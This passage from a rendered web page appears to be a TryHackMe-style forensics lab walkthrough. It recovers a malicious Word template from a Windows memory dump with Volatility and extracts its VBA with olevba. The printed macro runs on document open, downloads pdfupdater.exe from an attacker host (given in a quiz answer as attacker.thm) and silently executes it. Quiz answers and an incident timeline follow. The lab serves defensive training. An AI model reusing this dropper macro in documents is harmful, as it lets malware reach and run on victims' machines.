<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">typedef</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"> </span><span class="token class-name">_SECTION_OBJECT_POINTERS</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PVOID DataSectionObject</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PVOID SharedCacheMap</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PVOID ImageSectionObject</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    SECTION_OBJECT_POINTERS</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>It uses the object&#x27;s metadata, such as the file name and offset, to name the dumped file appropriately. If the file&#x27;s data is still resident in memory.</p>
<p>We already dumped this file in the previous room, and it should be available in the <code>5252/</code> directory, but we can do it again by using the command:</p>
<p><code>vol -f THM-WIN-001_071528_07052025.mem -o 5252/ windows.dumpfiles --pid 5252</code></p>
<p>Once we have access to that file dump, we can inspect it as we did when we identified a <strong>DOTM</strong> file with potential. Often, Macro-enabled files, such as <strong>DOCM</strong>, will have templates in DOTM files. This is the type of file we already found in the previous task by dumping the process <strong>WINWORD.EXE</strong>. We can search for it again using the grep command:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Terminal</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ubuntu@tryhackme$ </span><span class="token function" style="color:#d73a49">ls</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">/</span><span class="token operator" style="color:#393A34">|</span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> dotm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">file.0x990b2ae077d0.0x990b2a3f5d70.SharedCacheMap.Normal.dotm.vacb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">file.0x990b2ae077d0.0x990b2b916cd0.DataSectionObject.Normal.dotm.dat</span><br></span></code></pre></div></div>
<p>Great, so let&#x27;s copy the file to our home directory with the command <code>cp 5252/file.0x990b2ae077d0.0x990b2b916cd0.DataSectionObject.Normal.dotm.dat .</code> and let&#x27;s inspect it again, and confirm it&#x27;s a Word document file as we previously did using the <code>file</code> command and corroborate the file type as <strong>Word</strong>.</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Terminal</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ubuntu@tryhackme$ </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> file.0x990b2ae077d0.0x990b2b916cd0.DataSectionObject.Normal.dotm.dat</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">file.0x990b2ae077d0.0x990b2b916cd0.DataSectionObject.Normal.dotm.dat: Microsoft Word </span><span class="token number" style="color:#36acaa">2007</span><span class="token plain">+</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="confirm-macro-execution">Confirm Macro Execution<a href="#confirm-macro-execution" class="hash-link" aria-label="Direct link to Confirm Macro Execution" title="Direct link to Confirm Macro Execution" translate="no">​</a></h3>
<p>Let&#x27;s unzip the .dat file using the command <code>unzip</code>, and inspect the files. Let&#x27;s examine the word/ directory that was unzipped. We will find a VBA file called <strong>vbaProject.bin</strong>. If there&#x27;s a macro or potential malicious code, it should be there, so we will extract it using <code>olevba</code> (part of the <strong>oletools</strong> suite) with the command <code>olevba word/vbaProject.bin</code></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Terminal</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ubuntu@tryhackme$ olevba word/vbaProject.bin </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">XLMMacroDeobfuscator: pywin32 is not installed </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">only is required </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> you want to use MS Excel</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">REDACTED</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Sub AutoOpen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    DownloadAndExecute</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Sub Document_Open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    DownloadAndExecute</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Sub DownloadAndExecute</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim url As String</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim filePath As String</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim xmlhttp As Object</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim adoStream As Object</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;http:/[REDACTED]/pdfupdater.exe&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    filePath </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;C:\Users\operator\pdfupdater.exe&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&#x27; Delete file if it already exists</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">    If Dir(filePath) &lt;&gt; &quot;&quot; Then Kill filePath</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">    Set xmlhttp = CreateObject(&quot;MSXML2.XMLHTTP&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">    xmlhttp.Open &quot;GET&quot;, url, False</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">    xmlhttp.Send</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">    If xmlhttp.Status = 200 Then</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">        Set adoStream = CreateObject(&quot;ADODB.Stream&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">        adoStream.Type = 1 &#x27;</span><span class="token plain"> Binary</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        adoStream.Open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        adoStream.Write xmlhttp.responseBody</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        adoStream.SaveToFile filePath, </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27; Overwrite existing</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">        adoStream.Close</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">        Shell filePath, vbHide &#x27;</span><span class="token plain"> Run the </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> silently</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Else</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        MsgBox </span><span class="token string" style="color:#e3116c">&quot;Download failed. HTTP status: &quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> xmlhttp.Status</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    End If</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">REDACTED</span><span class="token punctuation" style="color:#393A34">]</span><br></span></code></pre></div></div>
<p>Excellent. We successfully recovered from memory the macro that the user executed, which was likely delivered through a document. This macro initiated the execution of <code>pdfupdater.exe</code> and revealed a URL that can help trace the origin of the activity, which we’ll explore further in the following task.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What command did we use to confirm that the dumped <code>.dat</code> file is a Microsoft Word document? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">file</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> According to the <code>olevba</code> output, what is the name of the file downloaded and executed by the macro? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pdfupdater.exe</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What is the full URL hardcoded in the macro for downloading the executable? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">http://attacker.thm/pdfupdater.exe</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-7-conclusion">Task 7 Conclusion<a href="#task-7-conclusion" class="hash-link" aria-label="Direct link to Task 7 Conclusion" title="Direct link to Task 7 Conclusion" translate="no">​</a></h2>
<p>In this room, we analyzed user activity through memory alone, tracking logins, sessions, commands, and file access. Each task focused on signs of interaction that helped us understand what actions took place on the system during the incident.</p>
<p>We worked entirely from RAM data, without relying on disk logs. Following these traces, we built a clear picture of user behavior and potential malicious activity. We can build a timeline so far that looks like the one below.</p>
<ol>
<li class="">The user operator was logged in and active at the time of memory capture: Confirmed via session data and loaded registry hive. Using <strong>windows.sessions</strong> and <strong>windows.registry.hivelist</strong> volatility plugins.</li>
<li class="">The malicious document <strong>cv-resume-test.docm</strong> was opened through Microsoft Word: Traced to the <strong>WINWORD.EXE</strong> process and file handle. Using <strong>windows.cmdline</strong> and <strong>windows.handles</strong> volatility plugins.</li>
<li class="">The document triggered a linked template (<strong>.dotm</strong>) that contained embedded macros: Identified by inspecting dumped file objects linked to WINWORD.EXE: Using the <strong>windows.dumpfiles</strong> volatility plugin and the grep command over the process directory.</li>
<li class="">The macro executed silently, downloading and running pdfupdater.exe from a remote server: Macro content extracted from memory and analyzed. Unzipping the <strong>.dotm</strong> and running <strong>olevba</strong> on <strong>vbaProject.bin</strong>.</li>
<li class="">The downloaded file spawned <strong>windows-update.exe</strong>, which then launched updater.exe: Confirmed through process relationships and creation order using <strong>pslist</strong>, <strong>cmdline</strong>, and process ancestry.</li>
<li class="">Post-exploitation activity became evident with the launch of cmd.exe and powershell.exe: Observed through active processes in the same session shortly after payload execution via <strong>sessions</strong> and <strong>pslist</strong>.</li>
<li class="">UserAssist entries confirmed interactive applications like Command Prompt were launched: Recovered from the operator’s <strong>NTUSER.DAT</strong> hive using the <strong>windows.registry.userassist</strong> volatility plugin for <strong>GUI-driven</strong> execution evidence.</li>
</ol>
<p>In the next room of this module, we&#x27;ll learn how network connections can be tracked and traced similarly. We will also finish the timeline we are currently building to try to uncover the whole attack chain.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Click to complete the room. </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col noPrint_WFHX"><a href="https://github.com/TryHackMyOffsecBox/TryHackMe-CN/tree/main/packages/create-docusaurus/templates/shared/docs/Modules/Memory Analysis/windowsmemoryanduseractivity.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/TryHackMe-CN/en/docs/Modules/Memory Analysis/windowsmemoryandprocs"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Windows Memory &amp; Processes</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/TryHackMe-CN/en/docs/Modules/Microsoft Defender XDR/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Microsoft Defender XDR</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#task-1-introduction" class="table-of-contents__link toc-highlight">Task 1 Introduction</a><ul><li><a href="#learning-objectives" class="table-of-contents__link toc-highlight">Learning Objectives</a></li><li><a href="#prerequisites" class="table-of-contents__link toc-highlight">Prerequisites</a></li></ul></li><li><a href="#task-2-scenario-information" class="table-of-contents__link toc-highlight">Task 2 Scenario Information</a><ul><li><a href="#scenario" class="table-of-contents__link toc-highlight">Scenario</a></li><li><a href="#information-incident-thm-0001" class="table-of-contents__link toc-highlight">Information Incident THM-0001</a></li><li><a href="#company-information-tryhatme" class="table-of-contents__link toc-highlight">Company Information TryHatMe</a></li></ul></li><li><a href="#task-3-environment--setup" class="table-of-contents__link toc-highlight">Task 3 Environment &amp; Setup</a></li><li><a href="#task-4-tracking-sessions" class="table-of-contents__link toc-highlight">Task 4 Tracking Sessions</a><ul><li><a href="#sessions" class="table-of-contents__link toc-highlight">Sessions</a></li><li><a href="#logged-sessions" class="table-of-contents__link toc-highlight">Logged Sessions</a></li><li><a href="#find-loaded-registry-hives" class="table-of-contents__link toc-highlight">Find Loaded Registry Hives</a></li><li><a href="#graphical-interface-activity" class="table-of-contents__link toc-highlight">Graphical Interface Activity</a></li></ul></li><li><a href="#task-5-command-execution--file-access" class="table-of-contents__link toc-highlight">Task 5 Command Execution &amp; File Access</a><ul><li><a href="#execution" class="table-of-contents__link toc-highlight">Execution</a></li><li><a href="#file-access" class="table-of-contents__link toc-highlight">File Access</a></li></ul></li><li><a href="#task-6-tracing-user-execution" class="table-of-contents__link toc-highlight">Task 6 Tracing User Execution</a><ul><li><a href="#locating-the-template-file" class="table-of-contents__link toc-highlight">Locating the Template File</a></li><li><a href="#confirm-macro-execution" class="table-of-contents__link toc-highlight">Confirm Macro Execution</a></li></ul></li><li><a href="#task-7-conclusion" class="table-of-contents__link toc-highlight">Task 7 Conclusion</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Docs</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/TryHackMe-CN/en/docs">Tutorial</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/TryHackMyOffsecBox" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github - TryHackMyOffsecBox<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://github.com/CRONUS-Security" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github - CRONUS-Security<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 TryHackMyOffsecBox. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>